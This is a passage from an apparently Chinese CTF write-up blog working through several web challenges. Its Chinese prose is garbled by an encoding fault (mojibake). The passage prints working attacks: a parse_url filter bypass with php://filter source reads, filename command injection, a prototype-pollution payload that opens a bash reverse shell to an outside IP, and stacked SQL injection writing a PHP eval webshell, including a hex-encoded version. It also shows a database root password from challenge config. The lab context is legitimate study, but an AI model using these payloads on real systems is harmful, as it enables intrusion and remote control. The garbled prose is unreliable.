$mysqli->query($sql_query);\n    return $res;\n}\n\nfunction login($user, $pass)\n{\n    $user = Filter($user);\n    $pass = md5($pass);\n    $sql = \"select * from `albert_users` where `username_which_you_do_not_know`= '$user' and `password_which_you_do_not_know_too` = '$pass'\";\n    echo $sql;\n    $res = sql_query($sql);\n//    var_dump($res);\n//    die();\n    if ($res->num_rows) {\n        $data = $res->fetch_array();\n        $_SESSION['user'] = $data[username_which_you_do_not_know];\n        $_SESSION['login'] = 1;\n        $_SESSION['isadmin'] = $data[isadmin_which_you_do_not_know_too_too];\n        return true;\n    } else {\n        return false;\n    }\n    return;\n}\n\nfunction updateadmin($level,$user)\n{\n    $sql = \"update `albert_users` set `isadmin_which_you_do_not_know_too_too` = '$level' where `username_which_you_do_not_know`='$user' \";\n    echo $sql;\n    $res = sql_query($sql);\n//    var_dump($res);\n//    die();\n//    die($res);\n    if ($res == 1) {\n        return true;\n    } else {\n        return false;\n    }\n    return;\n}\n\nfunction register($user, $pass)\n{\n    global $mysqli;\n    $user = Filter($user);\n    $pass = md5($pass);\n    $sql = \"insert into `albert_users`(`username_which_you_do_not_know`,`password_which_you_do_not_know_too`,`isadmin_which_you_do_not_know_too_too`) VALUES ('$user','$pass','0')\";\n    $res = sql_query($sql);\n    return $mysqli->insert_id;\n}\n\nfunction logout()\n{\n    session_destroy();\n    Header(\"Location: index.php\");\n}\n\n?>\n```\n\nconfig.php\n\n```php\n<?php\nerror_reporting(E_ERROR | E_WARNING | E_PARSE);\ndefine(BASEDIR, \"/var/www/html/\");\ndefine(FLAG_SIG, 1);\n$OPERATE = array('userinfo','upload','search');\n$OPERATE_admin = array('userinfo','upload','search','manage');\n$DBHOST = \"localhost\";\n$DBUSER = \"root\";\n$DBPASS = \"Nu1LCTF2018!@#qwe\";\n//$DBPASS = \"\";\n$DBNAME = \"N1CTF\";\n$mysqli = @new mysqli($DBHOST, $DBUSER, $DBPASS, $DBNAME);\nif(mysqli_connect_errno()){\n        echo \"no sql connection\".mysqli_connect_error();\n        $mysqli=null;\n        die();\n}\n?>\n```\n\nä»£ç å®¡è®¡ä¸€ä¸‹æ²¡å‘ç°ä»€ä¹ˆä¸å¯¹çš„ æˆ‘ä»¥ä¸ºæ˜¯sqlæ³¨å…¥\n\nä½†æ˜¯çœ‹äº†wp å‘ç°æ˜¯æˆ‘æ²¡å­¦åˆ°çš„çŸ¥è¯†ç‚¹\n\nå…¶ä»–æ–‡ä»¶æ²¡æœ‰ä»€ä¹ˆ ç›´æ¥æ¥çœ‹é‡è¦çš„function.php\n\nå®šä½åˆ°ï¼š\n\n```php\nfunction filter_directory_guest()\n{\n    $keywords = [\"flag\",\"manage\",\"ffffllllaaaaggg\",\"info\"];\n    $uri = parse_url($_SERVER[\"REQUEST_URI\"]);\n    parse_str($uri['query'], $query);\n//    var_dump($query);\n//    die();\n    foreach($keywords as $token)\n    {\n        foreach($query as $k => $v)\n        {\n            if (stristr($k, $token))\n                hacker();\n            if (stristr($v, $token))\n                hacker();\n        }\n    }\n}\n```\n\nå‘ç°å­˜åœ¨parse_urlè§£ææ¼æ´\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689742999096-b318c342-ce4a-475b-a82b-479e913e7f0b.png)\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689743053375-32586548-cdef-45ab-9fd0-9d420a14c6b5.png)\n\nå¯ä»¥å€ŸåŠ©ä¸€ä¸ªdemoæ¥ç†è§£\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689743421112-e924c505-196c-450c-8811-58f86831aa55.png)\n\n parse_url()ä¼šæŠŠ`//`è®¤ä¸ºæ˜¯ç›¸å¯¹è·¯å¾„ \n\näºæ˜¯å½“æˆ‘ä»¬åœ¨è·¯å¾„å‰å¤šè¾“å…¥ä¸€ä¸ª/ï¼Œä¼šä½¿è¿™ä¸ªå‡½æ•°å¤±æ•ˆï¼Œè¿™æ ·å°±ç»•è¿‡äº†æ£€æµ‹  \n\nå¦‚æœæˆ‘ä»¬ç›´æ¥è¾“å…¥`/user.php?page=php://filter/read=convert.base64-encode/resource=ffffllllaaaaggg`ä¼šè¢«æ£€æµ‹\n\nä½†æ˜¯åœ¨å‰é¢å¤šåŠ ä¸€ä¸ª`/`æˆåŠŸè¯»åˆ°äº†æºç \n\n```\n//user.php?page=php://filter/read=convert.base64-encode/resource=ffffllllaaaaggg\n<?php\nif (FLAG_SIG != 1){\n    die(\"you can not visit it directly\");\n}else {\n    echo \"you can find sth in m4aaannngggeee\";\n}\n?>\n```\n\nåˆ©ç”¨ä¼ªåè®®è¯»æºç  \n\nç„¶åå¾—åˆ°\n\n```php\n<?php\nif (FLAG_SIG != 1){\n    die(\"you can not visit it directly\");\n}\ninclude \"templates/upload.html\";\n\n?>\n```\n\nè®¿é—®`/templates/upload.html`\n\nä½†æ˜¯æ˜¯ä¸ªå‡çš„ä¸Šä¼ ç‚¹\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689742013537-59d3d70f-8100-4372-a4d1-ffb424e4e727.png)\n\néšä¾¿ä¸Šä¼ ä¸€ä¸ªæ–‡ä»¶ä¹‹åä¼šæŠ¥é”™å¹¶ä¸”å‘ç°å­˜åœ¨`/upllloadddd.php`\n\nç„¶ååˆ©ç”¨å‰é¢çš„ä¼ªåè®®è·å–æºç \n\n```php\n<?php\n$allowtype = array(\"gif\",\"png\",\"jpg\");\n$size = 10000000;\n$path = \"./upload_b3bb2cfed6371dfeb2db1dbcceb124d3/\";\n$filename = $_FILES['file']['name'];\nif(is_uploaded_file($_FILES['file']['tmp_name'])){\n    if(!move_uploaded_file($_FILES['file']['tmp_name'],$path.$filename)){\n        die(\"error:can not move\");\n    }\n}else{\n    die(\"error:not an upload fileï¼\");\n}\n$newfile = $path.$filename;\necho \"file upload success<br />\";\necho $filename;\n$picdata = system(\"cat ./upload_b3bb2cfed6371dfeb2db1dbcceb124d3/\".$filename.\" | base64 -w 0\");\necho \"<img src='data:image/png;base64,\".$picdata.\"'></img>\";\nif($_FILES['file']['error']>0){\n    unlink($newfile);\n    die(\"Upload file error: \");\n}\n$ext = array_pop(explode(\".\",$_FILES['file']['name']));\nif(!in_array($ext,$allowtype)){\n    unlink($newfile);\n}\n?>\n```\n\nç›´æ¥å®šä½åˆ°è¿™ä¸€è¡Œä»£ç \n\n```\n$picdata = system(\"cat ./upload_b3bb2cfed6371dfeb2db1dbcceb124d3/\".$filename.\" | base64 -w 0\");\n```\n\nå‘ç°å­˜åœ¨æ–‡ä»¶ä¸Šä¼ åæ¼æ´ å¯ä»¥ä¿®æ”¹æ–‡ä»¶åé—­åˆå‘½ä»¤æ‰§è¡Œ\n\nä½†æ˜¯çœŸæ­£çš„ä¸Šä¼ ç‚¹åœ¨å“ªå‘¢ çœ‹äº†wp\n\n```\n/user.php?page=m4aaannngggeee\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689742213512-efa5426d-7232-415f-bca5-7372374dc56a.png)\n\nç”±äºä¸èƒ½è®©move_uploaded_fileæŠ¥é”™ï¼Œæ–‡ä»¶åé‡Œä¸èƒ½æœ‰/è¿™ç§è·¯å¾„å­—ç¬¦  \n\n```javascript\nif(is_uploaded_file($_FILES['file']['tmp_name'])){\n    if(!move_uploaded_file($_FILES['file']['tmp_name'],$path.$filename)){\n        die(\"error:can not move\");\n    }\n```\n\næ‰€ä»¥å¦‚æœæˆ‘ä»¬æ‰§è¡Œå‘½ä»¤ `ls /`è¿™æ · é‚£ä¹ˆå°±ä¼šdieå‡ºå» æ²¡æœ‰å›æ˜¾ éš¾æ€ªæˆ‘ä¸€å¼€å§‹ä¸€ç›´åœ¨è¿™é‡Œå›°æƒ‘ \n\nç¿»åˆ«äººçš„åšå®¢çœ‹wpçœŸæ˜¯ä¸€ä»¶ç¾äº‹å•Š:)\n\n```\n;cd ..;ls;#\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689741475222-474413c2-512d-4fdc-9496-c77c237cf241.png)\n\n```\n;cd ..;cat flag_233333;#\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689741512376-6e560d1f-9068-48c5-a07b-73a7ed625bb8.png)\n\n# 118ã€[å¼ºç½‘æ¯ 2019]Upload\n\nåˆè¦ä»£ç å®¡è®¡å…ˆç•™ç€\n\n# 119ã€[GYCTF2020]Ez_Express\n\nä¸€é“jsçš„åŸå‹é“¾æ±¡æŸ“+sstiçš„ç»„åˆé¢˜ç›® æŒºä¸é”™çš„\n\né¦–å…ˆè®¿é—®ä¸»é¡µ ä»–è®©æˆ‘ä»¬ç”¨ADMIN ç™»å½• ç„¶åå­˜åœ¨ä¸€ä¸ªæºç æ³„éœ² \n\n`/www.zip`ä¸‹åˆ°æºç \n\næ”¾ä¸€ä¸‹é‡è¦çš„æºç ï¼š\n\n```javascript\nvar express = require('express');\nvar router = express.Router();\nconst isObject = obj => obj && obj.constructor && obj.constructor === Object;\nconst merge = (a, b) => {\n  for (var attr in b) {\n    if (isObject(a[attr]) && isObject(b[attr])) {\n      merge(a[attr], b[attr]);\n    } else {\n      a[attr] = b[attr];\n    }\n  }\n  return a\n}\nconst clone = (a) => {\n  return merge({}, a);\n}\nfunction safeKeyword(keyword) {\n  if(keyword.match(/(admin)/is)) {\n    return keyword\n  }\n\n  return undefined\n}\n\nrouter.get('/', function (req, res) {\n  if(!req.session.user){\n    res.redirect('/login');\n  }\n  res.outputFunctionName=undefined;\n  res.render('index',data={'user':req.session.user.user});\n});\n\n\nrouter.get('/login', function (req, res) {\n  res.render('login');\n});\n\n\n\nrouter.post('/login', function (req, res) {\n  if(req.body.Submit==\"register\"){\n    if(safeKeyword(req.body.userid)){\n      res.end(\"<script>alert('forbid word');history.go(-1);</script>\") \n    }\n    req.session.user={\n      'user':req.body.userid.toUpperCase(),\n      'passwd': req.body.pwd,\n      'isLogin':false\n    }\n    res.redirect('/'); \n  }\n  else if(req.body.Submit==\"login\"){\n    if(!req.session.user){res.end(\"<script>alert('register first');history.go(-1);</script>\")}\n    if(req.session.user.user==req.body.userid&&req.body.pwd==req.session.user.passwd){\n      req.session.user.isLogin=true;\n    }\n    else{\n      res.end(\"<script>alert('error passwd');history.go(-1);</script>\")\n    }\n\n  }\n  res.redirect('/'); ;\n});\nrouter.post('/action', function (req, res) {\n  if(req.session.user.user!=\"ADMIN\"){res.end(\"<script>alert('ADMIN is asked');history.go(-1);</script>\")} \n  req.session.user.data = clone(req.body);\n  res.end(\"<script>alert('success');history.go(-1);</script>\");  \n});\nrouter.get('/info', function (req, res) {\n  res.render('index',data={'user':res.outputFunctionName});\n})\nmodule.exports = router;\n```\n\nçœ‹åˆ°äº†æˆ‘ä»¬çš„è€æœ‹å‹ merge() å‘¢å°±è‚¯å®šå­˜åœ¨åŸå‹é“¾æ±¡æŸ“\n\né¡ºç€çœ‹é€»è¾‘ é¦–å…ˆæ˜¯ç™»é™†\n\n```javascript\nrouter.post('/login', function (req, res) {\n  if(req.body.Submit==\"register\"){\n    if(safeKeyword(req.body.userid)){\n      res.end(\"<script>alert('forbid word');history.go(-1);</script>\") \n    }\n    req.session.user={\n      'user':req.body.userid.toUpperCase(),\n      'passwd': req.body.pwd,\n      'isLogin':false\n    }\n    res.redirect('/'); \n  }\n  else if(req.body.Submit==\"login\"){\n    if(!req.session.user){res.end(\"<script>alert('register first');history.go(-1);</script>\")}\n    if(req.session.user.user==req.body.userid&&req.body.pwd==req.session.user.passwd){\n      req.session.user.isLogin=true;\n    }\n    else{\n      res.end(\"<script>alert('error passwd');history.go(-1);</script>\")\n    }\n\n  }\n  res.redirect('/'); ;\n});\n```\n\n`'user':req.body.userid.toUpperCase()`è¿™é‡Œå­˜åœ¨ä¸€ä¸ªæŠŠæˆ‘ä»¬åå­—è½¬ä¸ºå¤§å†™çš„æ“ä½œ\n\nå…¶å®è€ƒäº†javascriptå¤§å°å†™ç‰¹æ€§\n\nåœ¨jsä¸­ æœ‰ä¸€ç§ç±»å­—ç¬¦ æ¯”å¦‚`admÄ±n`çœ‹èµ·æ¥åƒæˆ‘ä»¬å¹³å¸¸çš„admin ä½†æ˜¯ä»–çš„`Ä±`å­—ç¬¦å¹¶ä¸æ˜¯æˆ‘ä»¬å¸¸ç”¨çš„i ä½†æ˜¯ç»è¿‡è¿™ä¸ªtoUpperCase()å‡½æ•°ä¹‹å å°±ä¼šå˜ä¸ºå¤§å†™çš„`I` é‚£ä¹ˆå°±å¯ä»¥bypassäº† å½“ç„¶ä¹Ÿä¼šå­˜åœ¨è½¬å°å†™çš„æ“ä½œ éƒ½æ˜¯ä¸€ä¸ªæ€è·¯\n\nå‚è€ƒï¼šhttps://www.leavesongs.com/HTML/javascript-up-low-ercase-tip.html\n\næ³¨å†Œ`admÄ±n` ç„¶åç™»å½•å°±ç”¨`ADMIN` æˆåŠŸç™»å½•\n\nç„¶ååˆ°äº†`/action`è·¯ç”±\n\n```javascript\nrouter.post('/action', function (req, res) {\n  if(req.session.user.user!=\"ADMIN\"){res.end(\"<script>alert('ADMIN is asked');history.go(-1);</script>\")} \n  req.session.user.data = clone(req.body);\n  res.end(\"<script>alert('success');history.go(-1);</script>\");  \n});\n```\n\n `req.session.user.data = clone(req.body);`è¿™ä¸€æ¡è¯­å¥ç”¨åˆ°äº†æˆ‘ä»¬çš„åŸå‹é“¾æ±¡æŸ“\n\né‚£ä¹ˆåº”è¯¥æ±¡æŸ“è°å‘¢ æš‚ä¸”æ”¾ç€\n\nå†æ¥çœ‹`/info`è·¯ç”±\n\n```javascript\nrouter.get('/info', function (req, res) {\n  res.render('index',data={'user':res.outputFunctionName});\n})\nmodule.exports = router;\n```\n\nåˆæ˜¯è€æœ‹å‹render çœ‹åˆ°ä»–å°±æƒ³åˆ°ssti \n\nå¯ä»¥çœ‹åˆ°å¦‚æœæˆ‘ä»¬èƒ½æ§åˆ¶`utputFunctionName`è¿™ä¸ªå‚æ•°æˆ‘ä»¬å°±å¯ä»¥è¿›è¡Œsstiäº†\n\nè·Ÿè¸ªä¸€ä¸‹ ç«Ÿç„¶å‘ç°è¿™ä¸ªå˜é‡æ²¡æœ‰å®šä¹‰\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689748463034-f5b3908d-9721-433c-aabf-caf52a779bc9.png)\n\nè¿™å°±å¾ˆè¯¡å¼‚äº† æ‰€ä»¥æˆ‘ä»¬å¯ä»¥åœ¨`/action`è·¯ç”±ä¸‹å¯¹ä»–è¿›è¡ŒåŸå‹é“¾æ±¡æŸ“  ç„¶ååœ¨`/info `å¯¹ä»–è¿›è¡Œssti è¿™æ ·å°±èƒ½getshelläº†\n\nè¯·æ±‚åŒ…paylaod:\n\n```javascript\nPOST /action HTTP/1.1\nHost: a041d509-23fe-47c0-8d98-0f5b4ac46eaf.node4.buuoj.cn:81\nContent-Length: 178\nCache-Control: max-age=0\nUpgrade-Insecure-Requests: 1\nOrigin: http://a041d509-23fe-47c0-8d98-0f5b4ac46eaf.node4.buuoj.cn:81\nContent-Type: application/json\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\nReferer: http://a041d509-23fe-47c0-8d98-0f5b4ac46eaf.node4.buuoj.cn:81/\nAccept-Encoding: gzip, deflate\nAccept-Language: zh-CN,zh;q=0.9\nCookie: __gads=ID=2a013f3dde9ad985-2254f58cafe700cf:T=1689741221:RT=1689742200:S=ALNI_Maqp-fX6ej98tcXJHWIvb4mWhQdSg; __gpi=UID=00000c2221d9f3e8:T=1689741221:RT=1689742200:S=ALNI_MZMzVabCNghJHJfa6k9qDxOuQgInA; session=s%3A3n0kVmpVgibTGbZVYa8G39JKQSWntKeb.vA90xq%2FPvNzD14nbbu%2BW1WAfLwNX6o9st2OOFs%2Bgyqc\nConnection: close\n\n{\"Submit\":\"\",\"lua\":\"\",\"__proto__\":{\"outputFunctionName\":\"_tmp1;global.process.mainModule.require('child_process').exec('bash -c \\\"bash -i >& /dev/tcp/8.130.34.53/7777 0>&1\\\"')\"}}\n```\n\nè¿™é‡Œè¦æ³¨æ„å°±æ˜¯æˆ‘ä»¬æäº¤çš„payloadå½¢å¼ä¸€å®šè¦æ˜¯jsonæ ¼å¼çš„  `Content-Type: application/json`\n\nç„¶åæˆ‘è¿™é‡Œæ˜¯ç”¨åå¼¹shell\n\nè®¿é—®`/info `  æˆåŠŸ\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689748624364-dcb3a261-6eda-4b4c-b527-ca68431e5347.png)\n\n# 120ã€[SUCTF 2018]MultiSQL\n\nè€ƒç‚¹ï¼šmysqlé¢„ç¼–è¯‘ å¤ä¹ ä¸€ä¸‹æ—§çŸ¥è¯† éƒ½å¥½ä¹…äº† å¿˜äº†\n\nçœ‹æ ‡é¢˜å°±æ˜¯sqlæ³¨å…¥\n\né¦–å…ˆåœ¨æ³¨å†Œçš„æ—¶å€™å°±å¤šåŠ ä¸ª`'` çœ‹çœ‹ä¼šæ€æ · ä¸€èˆ¬è¿™é‡Œå¯èƒ½ä¼šå­˜åœ¨äºŒæ¬¡æ³¨å…¥ä¹‹ç±»çš„\n\nå‘ç°è¢«è½¬ä¹‰äº† ä½œç½¢\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689838045915-1e652331-c3d3-49a1-8689-efe900b70c8f.png)\n\nç‚¹ç”¨æˆ·ä¿¡æ¯å‘ç°urlä¸å¯¹åŠ²\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689838230226-da7aa30a-ee41-4f54-b33b-ad23d0c2f0f4.png)\n\næ„Ÿè§‰è¿™é‡Œå­˜åœ¨sqlæ³¨å…¥\n\nfuzz å‘ç°è¿‡æ»¤äº†`unionï¼Œselect ï¼Œ&ï¼Œ|` é‚£ä¹ˆæˆ‘ä»¬ä¸€èˆ¬çš„selectæŸ¥è¯¢å°±ä¸è¦æƒ³äº†\n\nç„¶åè¿™é“é¢˜ç›®å…¶å®è€ƒå¯Ÿçš„æ˜¯å †å æ³¨å…¥\n\nç„¶åæ­é…é¢„ç¼–è¯‘å†™ğŸ\n\næœ‰ä¸¤ç§æ–¹å¼ ä¸€ç§æ˜¯ç”¨char()å†™ğŸ å¦ä¸€ç§æ˜¯16è¿›åˆ¶æ­é…hex()å‡½æ•°å†™ğŸ\n\nåœ¨åšè¿™é“é¢˜ç›®ä¹‹å‰è¿˜ä»æ¥æ²¡åœ¨sqlæ³¨å…¥çš„æ—¶å€™å†™è¿‡ğŸ å±äºæ˜¯ç¬¬ä¸€æ¬¡è§äº†\n\né¦–å…ˆæ˜¯é¢„ç¼–è¯‘ åœ¨å¾ˆæ—©ä»¥å‰ åšbuué¢˜ç›®çš„æ—¶å€™å°±è§è¿‡é¢„ç¼–è¯‘\n\né¦–å…ˆæ˜¯`set @A=sqlè¯­å¥;prepare B from @A;execute B;`æ ¼å¼å°±æ˜¯å¦‚æ­¤\n\nè¿™é‡Œçš„sqlè¯­å¥å°±æ˜¯æˆ‘ä»¬è¦åœ¨mysqlä¸­å†™ä¸€å¥è¯æœ¨é©¬çš„è¯­å¥ å¦‚ä¸‹æ ¼å¼\n\nå…¶å®æˆ‘æœ€æ‡µé€¼çš„å°±æ˜¯è¿™ä¸ªè·¯å¾„ä¸ºä»€ä¹ˆè¦åœ¨`/favicon`ä¸‹ å¾ˆå¥‡æ€ª ä¸ºä»€ä¹ˆ ç›´æ¥åœ¨`/var/www/html`å°±ä¸è¡Œ çœ‹äº†å¾ˆå¤šwp å°±æ˜¯æ²¡æåŠè¿™ä¸€ç‚¹  ä¹‹ååœ¨ç¥ã®çš„wpä¸­ å‘ç°æ˜¯é¢˜ç›®å¯ä»¥æ‰«åˆ°ä¸€ä¸ªè¿™ä¸ªç›®å½• çœŸå¤¸å¼  å¾¡å‰‘çš„å­—å…¸æ²¡è¿™ä¸ªç›®å½• å¦‚æœçœŸåœ¨æ¯”èµ›ä¸­åš æˆ‘ç™¾åˆ†ä¹‹ç™¾åšä¸å‡ºæ¥\n\n```\nselect '<?php eval($_POST[cmd]);?>' into outfile '/var/www/html/favicon/shell.php';\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689840034510-98325feb-b607-4124-bebc-3c2155883f5d.png)\n\n## ç¬¬ä¸€ç§char()å†™ğŸ\n\nåŸç†ï¼š\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689841296825-af77f53d-2cd9-4628-bce9-ce1423b66c83.png)\n\nå°±æ˜¯åˆ©ç”¨charå‡½æ•° bypass å¯¹selectç­‰å­—ç¬¦çš„é™åˆ¶\n\néšä¾¿å†™ä¸ªè„šæœ¬ è·‘ä¸€ä¸‹å°±è¡Œäº†\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689841351215-aff04d5a-2019-4055-8abc-c8cf413c22c4.png)\n\npayload:\n\n`select '<?php eval($_POST[x]);?>' into outfile '/var/www/html/favicon/1.php';` è½¬æˆå¯¹åº”çš„asciiç¼–ç çš„å­—ç¬¦ ç„¶åæ­é…é¢„ç¼–è¯‘æ‰“å…¥å³å¯\n\n## ç¬¬äºŒç§ hex()æ­é…åå…­è¿›åˆ¶å†™ğŸ\n\npayloadå’Œä¸Šé¢ä¸€æ ·åªä¸è¿‡ è¿™é‡Œè½¬ä¸º16è¿›åˆ¶å°±è¡Œäº†\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689841581083-5f4b6cae-f94e-4b3f-b789-3d2336b40959.png)\n\nåŸç†ï¼š\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689841713358-d2c8e3ff-c663-4305-85dc-74b7785188e7.png)\n\npayload:\n\n```\nselect '<?php eval($_POST[x]);?>' into outfile '/var/www/html/favicon/1.php';\nset @A=0x73656C65637420273C3F706870206576616C28245F504F53545B636D645D293B3F3E2720696E746F206F757466696C6520272F7661722F7777772F68746D6C2F66617669636F6E2F7368656C6C2E706870273B;prepare B from @A;execute B;\n```\n\n\n\n# 121ã€bestphp's revenge\n\nå•Šå•Šå•Šå•Š  åˆæ˜¯ä¿¡æ¯çˆ†ç‚¸çš„ä¸€é¢˜ çœŸæ˜¯ä¸€é¢˜æ¯”ä¸€é¢˜ç‚¸è£‚ ä¸€å¤©åšä¸€é¢˜å¼„æ˜ç™½è„‘å­å°±å·²ç»ç‚¸äº†\n\nä¸€å…±æœ‰ä¸¤ä¸ªæ–‡ä»¶\n\nindex.php\n\n```php\n<?php\n  highlight_file(__FILE__);\n$b = 'implode';\ncall_user_func($_GET['f'], $_POST);\nsession_start();\nif (isset($_GET['name'])) {\n  $_SESSION['name'] = $_GET['name'];\n}\nvar_dump($_SESSION);\n$a = array(reset($_SESSION), 'welcome_to_the_lctf2018');\ncall_user_func($b, $a);\n?>\n```\n\nflag.php\n\n```php\nonly localhost can get flag!session_start();\necho 'only localhost can get flag!';\n$flag = 'LCTF{*************************}';\nif($_SERVER[\"REMOTE_ADDR\"]===\"127.0.0.1\"){\n       $_SESSION['flag'] = $flag;\n   }\nonly localhost can get flag!\n```\n\nçœ‹flag.php æˆ‘ä»¬éœ€è¦æœ¬åœ°è®¿é—®æ‰èƒ½æ‹¿åˆ°flag \n\nä½†æ˜¯æˆ‘ä»¬ç›´æ¥é€šè¿‡xffä¿®æ”¹ipè·å–ä¸åˆ° è¿™é‡Œå°±å¾ˆåƒä¹‹å‰åšçš„ä¸€é“é¢˜ç›®\n\nè¦é€šè¿‡ssrf æ‰“æ‰è¡Œ\n\næ¥åˆ†æä¸€ä¸‹index.php\n\n## call_user_func()\n\né¦–å…ˆæ˜¯ä¸€ä¸ªcall_user_func() ç¬¬ä¸€ä¸ªå‚æ•°ä½œä¸ºå›è°ƒå‡½æ•°æ‰§è¡Œ ç¬¬äºŒä¸ªå‚æ•°ä½œä¸ºå›è°ƒå‡½æ•°çš„å‚æ•°ä¼ å…¥\n\nä½†æ˜¯è¿™é‡Œä¸€å¼€å§‹æˆ‘åœ¨æƒ³ä¸ºä»€ä¹ˆä¸ç›´æ¥é€šè¿‡system()å½“å›è°ƒå‡½æ•° ç›´æ¥è¿›è¡Œå‘½ä»¤æ‰§è¡Œ \n\nåæ¥å‘ç°$_POSTåªèƒ½ä»¥é”®å€¼ ä¹Ÿå°±æ˜¯A=Bçš„å½¢å¼ä¼ å…¥æ‰è¡Œ \n\nåªä¼ å…¥ä¸€ä¸ªAæ˜¯postä¸ä¸Šå»çš„ æ‰€ä»¥A=Bçš„å½¢å¼è‚¯å®šä¸ç¬¦åˆcall_user_func()ç¬¬äºŒä¸ªå‚æ•°æ— æœ\n\né™¤æ­¤ä¹‹å¤– è¿™ä¸ªå‡½æ•°ä¸ä»…ä»…åªèƒ½ä¼ å…¥å‡½æ•° è¿˜å¯ä»¥é€šè¿‡æ•°ç»„åŒ…å«ç±»çš„æ–¹å¼æ‰§è¡Œç±»çš„æ–¹æ³•\n\nå¦‚ä¸‹ï¼š\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689863056915-faa2b80d-4893-41f9-afaa-78862cad8a45.png)\n\n æŠŠç¬¬ä¸€ä¸ªå€¼å½“ä½œç±»åï¼Œç¬¬äºŒä¸ªå€¼å½“ä½œæ–¹æ³•è¿›è¡Œå›è°ƒ\n\n## php sessionååºåˆ—åŒ–æœºåˆ¶\n\nå…¶æ¬¡æ˜¯php sessionååºåˆ—åŒ–æœºåˆ¶ https://blog.spoock.com/2016/10/16/php-serialize-problem/ å…·ä½“å¯å‚è€ƒè¿™ä¸ªæ–‡ç«  è¿™ä¸ªå¸ˆå‚…å†™çš„å¾ˆè¯¦ç»†\n\nä¹‹å‰åœ¨ctfshow åˆ·é¢˜çš„æ—¶å€™ä¹Ÿé‡åˆ°äº†\n\n```\nsession.serialize_handler   string --å®šä¹‰ç”¨æ¥åºåˆ—åŒ–/ååºåˆ—åŒ–çš„å¤„ç†å™¨åå­—ã€‚é»˜è®¤ä½¿ç”¨php\n```\n\nsession.serialize_handleræ˜¯ç”¨æ¥è®¾ç½®sessionçš„åºåˆ—è¯å¼•æ“çš„ï¼Œé™¤äº†é»˜è®¤çš„PHPå¼•æ“ä¹‹å¤–ï¼Œè¿˜å­˜åœ¨å…¶ä»–å¼•æ“ï¼Œä¸åŒçš„å¼•æ“æ‰€å¯¹åº”çš„sessionçš„å­˜å‚¨æ–¹å¼ä¸ç›¸åŒã€‚  \n\nä¸€å…±æœ‰ä¸‰ç§\n\n- php_binary:å­˜å‚¨æ–¹å¼æ˜¯ï¼Œé”®åçš„é•¿åº¦å¯¹åº”çš„ASCIIå­—ç¬¦+é”®å+ç»è¿‡serialize()å‡½æ•°åºåˆ—åŒ–å¤„ç†çš„å€¼\n- php:å­˜å‚¨æ–¹å¼æ˜¯ï¼Œé”®å+ç«–çº¿+ç»è¿‡serialize()å‡½æ•°åºåˆ—å¤„ç†çš„å€¼\n- php_serialize(php>5.5.4):å­˜å‚¨æ–¹å¼æ˜¯ï¼Œç»è¿‡serialize()å‡½æ•°åºåˆ—åŒ–å¤„ç†çš„å€¼\n\nå­˜å‚¨æœºåˆ¶ï¼š\n\nphpä¸­çš„sessionä¸­çš„å†…å®¹å¹¶ä¸æ˜¯æ”¾åœ¨å†…å­˜ä¸­çš„ï¼Œè€Œæ˜¯ä»¥æ–‡ä»¶çš„æ–¹å¼æ¥å­˜å‚¨çš„ï¼Œå­˜å‚¨æ–¹å¼å°±æ˜¯ç”±é…ç½®é¡¹session.save_handleræ¥è¿›è¡Œç¡®å®šçš„ï¼Œé»˜è®¤æ˜¯ä»¥æ–‡ä»¶çš„æ–¹å¼å­˜å‚¨ã€‚\nå­˜å‚¨çš„æ–‡ä»¶æ˜¯ä»¥sess_sessionidæ¥è¿›è¡Œå‘½åçš„ï¼Œæ–‡ä»¶çš„å†…å®¹å°±æ˜¯sessionå€¼çš„åºåˆ—è¯ä¹‹åçš„å†…å®¹ã€‚\n\nå½“åºåˆ—åŒ–çš„å¼•æ“å’Œååºåˆ—åŒ–çš„å¼•æ“ä¸ä¸€è‡´æ—¶ï¼Œå°±å¯ä»¥åˆ©ç”¨å¼•æ“ä¹‹é—´çš„å·®å¼‚äº§ç”Ÿåºåˆ—åŒ–æ³¨å…¥æ¼æ´ã€‚  \n\nä¾‹å¦‚ä¼ å…¥`$_SESSION['name']='|O:5:\"Smi1e\":1:{s:4:\"test\";s:3:\"AAA\";}';` 